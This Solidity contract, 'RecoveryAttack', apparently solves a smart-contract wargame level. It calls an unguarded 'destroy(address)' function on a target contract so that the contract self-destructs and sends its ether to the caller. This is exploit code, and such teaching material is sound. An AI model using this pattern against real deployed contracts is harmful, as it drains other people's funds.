// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RecoveryAttack {
    function attack(address _tagetAddress) public returns (bool) {
        bytes memory payload = abi.encodeWithSignature(
            "destroy(address)",
            msg.sender
        );

        (bool success, ) = _tagetAddress.call(payload);
        return success;
    }
}
